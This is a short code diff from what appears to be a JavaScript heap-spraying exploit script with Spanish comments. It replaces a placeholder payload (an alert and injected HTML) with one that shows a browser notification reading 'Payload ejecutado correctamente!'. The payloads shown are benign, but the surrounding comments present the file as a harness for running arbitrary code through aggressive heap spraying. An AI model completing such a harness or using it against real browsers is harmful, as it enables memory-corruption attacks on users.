@@ -5,12 +5,28 @@
 
     // Definir el payload (puede ser cualquier código JS)
     const payload = `
-        (function() {
-            alert('Payload ejecutado correctamente!');
-            document.body.innerHTML += '<h1>Payload inyectado!</h1>';
-            console.log('Código del payload ejecutado.');
-        })();
-    `;
+    (function() {
+        if (!("Notification" in window)) {
+            console.error("Este navegador no soporta las notificaciones.");
+            return;
+        }
+
+        Notification.requestPermission().then(permission => {
+            if (permission === "granted") {
+                const notification = new Notification("Notificación del Sistema", {
+                    body: "¡Payload ejecutado correctamente!",
+                    icon: "https://example.com/icon.png"
+                });
+
+                notification.onclick = function() {
+                    console.log("Notificación clicada");
+                };
+            } else {
+                console.error("Permiso para mostrar notificaciones denegado.");
+            }
+        });
+    })();
+`;
 
     // Crear el heap spraying
     console.log("Iniciando heap spraying agresivo...");
